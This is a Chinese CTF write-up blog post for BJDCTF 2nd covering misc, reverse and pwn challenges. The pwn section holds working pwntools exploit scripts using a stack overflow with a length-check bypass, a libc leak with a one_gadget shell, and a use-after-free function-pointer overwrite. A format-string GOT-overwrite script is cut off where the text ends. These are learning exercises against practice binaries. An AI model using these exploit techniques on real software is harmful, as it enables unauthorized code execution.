<!DOCTYPE html><html class="theme-next gemini use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"><link rel="stylesheet" href="/css/main.css?v=7.1.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/xintiao_32.png?v=7.1.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/xintiao_16.png?v=7.1.0"><link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222"><link rel="manifest" href="/images/manifest.json"><meta name="msapplication-config" content="/images/browserconfig.xml"><script id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Gemini",version:"7.1.0",sidebar:{position:"left",display:"post",offset:12,onmobile:!1,dimmer:!1},back2top:!0,back2top_sidebar:!0,fancybox:!1,fastclick:!1,lazyload:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><meta property="og:type" content="article"><meta property="og:title" content="[BJDCTF 2nd]"><meta property="og:url" content="http://liul14n.top/2020/03/21/BJDCTF-2nd/index.html"><meta property="og:site_name" content="LiuLian"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/70858371_p0.jpg"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323225648.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323232227.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321165207.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321165245.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183154.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183226.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183321.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321162955.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321163330.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322185754.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322190314.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322190225.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323222653.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/3930e380f3d08436.jpg"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324023154.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324023212.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324014712.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ASDGASDFFEWAVXZC.jpg"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322234152.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323224751.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323005432.png"><meta property="og:updated_time" content="2020-03-23T19:27:50.645Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="[BJDCTF 2nd]"><meta name="twitter:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/70858371_p0.jpg"><link rel="canonical" href="http://liul14n.top/2020/03/21/BJDCTF-2nd/"><script id="page.configurations">CONFIG.page={sidebar:""}</script><title>[BJDCTF 2nd] | LiuLian</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">LiuLian</span> <span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-toggle"><button aria-label="切换导航栏"><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档<span class="badge">57</span></a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://liul14n.top/2020/03/21/BJDCTF-2nd/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="LiuLian"><meta itemprop="description" content="Salute The Time"><meta itemprop="image" content="/images/touxiang.jpeg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="LiuLian"></span><header class="post-header"><h2 class="post-title" itemprop="name headline">[BJDCTF 2nd]</h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2020-03-21 16:18:42" itemprop="dateCreated datePublished" datetime="2020-03-21T16:18:42+08:00">2020-03-21</time> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-03-24 03:27:50" itemprop="dateModified" datetime="2020-03-24T03:27:50+08:00">2020-03-24</time> </span><span class="post-category"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-eye"></i> 阅读次数： <span class="busuanzi-value" id="busuanzi_value_page_pv"></span></span><div class="post-symbolscount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">本文字数：</span> <span title="本文字数">43k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">36 分钟</span></div></div></header><div class="post-body" itemprop="articleBody"><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/70858371_p0.jpg" alt></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>菜是原罪</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h2><p>下载下来是个压缩包，解一下伪加密，得到一个名为Secret的文件，16进制查看以后发现存在<code>IHDR</code>这个Png文件的标志位，故推测这是个png文件，但缺少了头部的<code>89 50 4E 47</code>这四个字节，补齐，改拓展名为png即可，可以看到一堆HEX,转ASCII即为flag。</p><h2 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h2><p>改一下IHDR就能看到flag</p><h2 id="Easybaba"><a href="#Easybaba" class="headerlink" title="Easybaba"></a>Easybaba</h2><p>binwalk一下，发现有zip，提取出来，里面有个<code>里面全是出题人.jpg</code>，实际上这是个avi文件，然后avi抽帧，有好多二维码，每个二维码能扫出来一部分flag，组合起来是一串base16，解码得到疑似flag的字符串，看着像栅栏，但实际上不是，但是都是单词。。。还有很明显的恶搞意味，修改修改顺序就得到flag。</p><p><code>BJD{imagin_love_Y1ng}</code></p><h2 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h2><p>16进制查看器打开以后搜BJD即可。。。</p><h2 id="Real-EasyBaBa"><a href="#Real-EasyBaBa" class="headerlink" title="Real_EasyBaBa"></a>Real_EasyBaBa</h2><p>这题已吐…看着WP都难搞……</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323225648.png" alt></p><h2 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="圣火昭昭"></a>圣火昭昭</h2><p>这道题目相比于其他脑洞杂项题，还是有一些可以学习的新知识点的。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323232227.png" alt></p><h2 id="TARGZ-y1ng"><a href="#TARGZ-y1ng" class="headerlink" title="TARGZ-y1ng"></a>TARGZ-y1ng</h2><p>套娃题目，全当练算法了，WP说压缩了300层。。。。也就是300层套娃。。。压缩包的名字就是解压密码。。。</p><p>有个坑点…这些都是<code>zip</code>，但拓展名都是<code>tar.gz</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">path = <span class="string">'C:\\Users\\LiuLian\\Desktop\\test\\'</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">t0 = time.time()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = os.listdir(path)[<span class="number">0</span>]</span><br><span class="line">        zip = zipfile.ZipFile(path+name,<span class="string">'r'</span>)</span><br><span class="line">        newfilename = zip.namelist()[<span class="number">0</span>]</span><br><span class="line">        pwd = name.replace(<span class="string">'.tar.gz'</span>,<span class="string">''</span>)</span><br><span class="line">        zip.extract(newfilename,path,pwd)</span><br><span class="line">        zip.close()</span><br><span class="line">        os.remove(path+name)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[*] error or finished!'</span></span><br><span class="line">        t1 = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'总共运行了'</span> + str(t1-t0) + <span class="string">'秒'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'总共套了'</span> + str(count) + <span class="string">'层娃'</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] error or finished!</span><br><span class="line">总共运行了22.1809999943秒</span><br><span class="line">总共套了298层娃</span><br></pre></td></tr></table></figure><p>运行就能拿到一个名为flag的文件，里面就是flag。</p><p>脚本都跑了二十二秒多…. 手动解压的话估计要累到死。。。</p><p>运行结果显示总共套了298层娃。。。。</p><h2 id="Imagin开场曲"><a href="#Imagin开场曲" class="headerlink" title="Imagin开场曲"></a>Imagin开场曲</h2><p>挺有意思的杂项，就纯听力题…</p><p>不过通过这个题了解到一个挺好玩的东西叫<code>Mikutap</code></p><p><code>BJD{MIKUTAP3313313}</code></p><hr><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h2><p>IDA加载,<code>Shift+F12</code>即可看到flag。。。。。。</p><h2 id="8086"><a href="#8086" class="headerlink" title="8086"></a>8086</h2><p>这题考察汇编。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321165207.png" alt></p><p>但一些代码被IDA识别为数据了，按C还原为代码，即可看到程序的逻辑</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321165245.png" alt></p><p>所以对这个字符串<code>]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;</code>进行与0x1f异或的操作即可</p><p>flag: <code>BJD{jack_de_hu1b1an_xuede_henHa0}</code></p><hr><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>本次CTF的pwn题大部分都是<code>Ubuntu19.04</code>的，libc是<code>libc-2.29.so</code>，但通过<code>patchelf</code>依然可以在其他版本的U buntu上进行本地调试。</p><h2 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p>存在后门函数<code>0x804858B dl_registery()</code>调用<code>system(&#39;/bin/sh&#39;)</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183154.png" alt></p><p>main函数的read处没有栈溢出，接着看<code>name_check</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183226.png" alt></p><p>这里的strcpy可以操作一波，但是需要先绕过前面的长度检测，来看一下汇编</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321183321.png" alt></p><p>可以看到这里，调用完<code>strlen</code>以后长度保存在eax中，而这里是令<code>v3 = al</code>然后再进行的长度验证，也就是说真正验证的是长度的低字节。</p><p>所以就可以先构造好<code>payload</code>，然后<code>payload = payload.ljust(size,&#39;a&#39;)</code>,size取0x104<del>0x108或者0x204</del>0x208或者… 只要让它低字节在0x04~0x08之间即可，当然也不能超过read的size。<strong>还有一点需要注意，sendline相比send要多出一个\n，这也占size的。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line">c = process(<span class="string">'./r2t3'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',29366)</span></span><br><span class="line">backdoor = <span class="number">0x804858B</span></span><br><span class="line"><span class="comment">#gdb.attach(c,'b * 0x80485E1')</span></span><br><span class="line">c.recvuntil(<span class="string">'Please input your name:\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x11</span></span><br><span class="line">payload += <span class="string">'b'</span>*<span class="number">4</span></span><br><span class="line">payload += p32(backdoor) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x106</span>,<span class="string">'a'</span>)</span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序保护全开</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321162955.png" alt></p><p>但是在<code>init函数</code>里面存在一个leak，泄露了printf的地址，而且题目也提供了libc，所以可以泄露出libcbase</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200321163330.png" alt></p><p><code>main函数</code>也格外的和谐，直接读入<code>one_gadget</code>然后调用…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> one_gadget libc<span class="number">-2.29</span>.so </span><br><span class="line"><span class="number">0xe237f</span> execve(<span class="string">"/bin/sh"</span>, rcx, [rbp<span class="number">-0x70</span>])</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == <span class="literal">NULL</span> || rcx == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0x70</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe2383</span> execve(<span class="string">"/bin/sh"</span>, rcx, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rcx] == <span class="literal">NULL</span> || rcx == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe2386</span> execve(<span class="string">"/bin/sh"</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x106ef8</span> execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p><strong>这里似乎只有第四个能用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26393</span>)</span><br><span class="line"><span class="comment">#c = process('./one_gadget')</span></span><br><span class="line">elf = ELF(<span class="string">'./one_gadget'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.29.so'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'here is the gift for u:'</span>)</span><br><span class="line"></span><br><span class="line">libcbase = int(c.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">success(<span class="string">'libcbase = '</span> + hex(libcbase))</span><br><span class="line">oneGadget = libcbase + <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">c.sendline(str(oneGadget))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="ydsneedgirlfriend2"><a href="#ydsneedgirlfriend2" class="headerlink" title="ydsneedgirlfriend2"></a>ydsneedgirlfriend2</h2><p>真·入门级堆题，感谢出题人不杀之恩。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>题目提供4个功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>add a girlfriend</span><br><span class="line"><span class="number">2.</span>dele a girlfriend</span><br><span class="line"><span class="number">3.</span>show a girlfriend</span><br><span class="line"><span class="number">4.</span><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322185754.png" alt></p><p>其中<code>add</code>里面，只会在第一次add的时候在<code>girlfriends[0]</code>申请0x10大小的堆块。</p><p>在<code>*girlfriends[0]</code>存放的是最新一次add时，申请的name的chunk。</p><p>在<code>*girlfriends[1]</code>存放的是<code>print_girlfriend_name</code>的函数指针。</p><p><code>delete函数</code>存在<code>UAF</code>漏洞，free掉但未置为NULL。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322190314.png" alt></p><p>而且出题人太贴心了，给了<code>backdoor</code>函数</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322190225.png" alt></p><p>思路较为简单，借助<code>Fastbin</code>的<code>FILO</code>特性，结合<code>delete</code>函数中的free顺序可得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'b'</span>*<span class="number">8</span> + p64(backdoor))<span class="comment">#change print_girlfriend_name -&gt; backdoor</span></span><br><span class="line">show(<span class="number">0</span>)<span class="comment"># do backdoor</span></span><br></pre></td></tr></table></figure><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26074</span>)</span><br><span class="line"><span class="comment">#c = process('./ydsneedgirlfriend2')</span></span><br><span class="line">elf = ELF(<span class="string">'./ydsneedgirlfriend2'</span>)</span><br><span class="line">girlfriends = <span class="number">0x6020A0</span></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,name)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'u choice :\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Please input the length of her name:\n'</span>)</span><br><span class="line">    c.sendline(str(length))</span><br><span class="line">    c.recvuntil(<span class="string">'Please tell me her name:\n'</span>)</span><br><span class="line">    c.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'u choice :\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'u choice :\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'bbbbbbbb'</span>+p64(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="r2t4"><a href="#r2t4" class="headerlink" title="r2t4"></a>r2t4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x3ff000</span>)</span></span></span><br></pre></td></tr></table></figure><p>main函数有明显的格式化字符串漏洞和栈溢出，但只溢出了8个字节，只够覆盖掉rbp</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323222653.png" alt></p><p>存在backdoor函数，调用<code>system(&#39;cat flag&#39;)</code></p><p>看了半天没想起来怎么做，canary过不掉。。。赛后看了wp以后…</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/3930e380f3d08436.jpg" alt></p><p>既然canary过不掉，那就直接故意触发吧，修改<code>__stack_chk_fail_got</code>为<code>backdoor</code>即可。。。。</p><p>这里我之前写的<code>fmtstr_payload64</code>生成的payload的长度为0x40，超出read的size了，很无奈，只能按short类型来手动写了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">c = 